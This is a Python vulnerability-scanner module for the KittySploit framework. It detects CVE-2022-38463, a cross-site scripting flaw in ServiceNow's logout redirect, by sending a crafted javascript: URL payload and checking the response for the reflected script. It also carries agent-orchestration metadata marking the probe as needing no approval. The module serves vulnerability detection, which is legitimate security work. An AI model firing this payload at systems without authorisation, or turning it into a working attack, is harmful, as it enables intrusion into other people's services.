#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ServiceNow through San Diego Patch 4b and Patch 6 contains a cross-site scripting vulnerability in the logout ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ServiceNow - Cross-Site Scripting Detection',
        'description': 'ServiceNow through San Diego Patch 4b and Patch 6 contains a cross-site scripting vulnerability in the logout functionality, which can enable an unauthenticated remote attacker to execute arbitrary JavaScript.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'servicenow', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1156793',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-38463',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Henry4E36/POCS',
        ],
        'cve': 'CVE-2022-38463',
    }

    def run(self):
        r = self.http_request(method="GET", path='/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("top.location.href = 'javascript:alert(document.domain)';",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="ServiceNow - Cross-Site Scripting detected",
                path='/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)',
            )
            return True
        return False

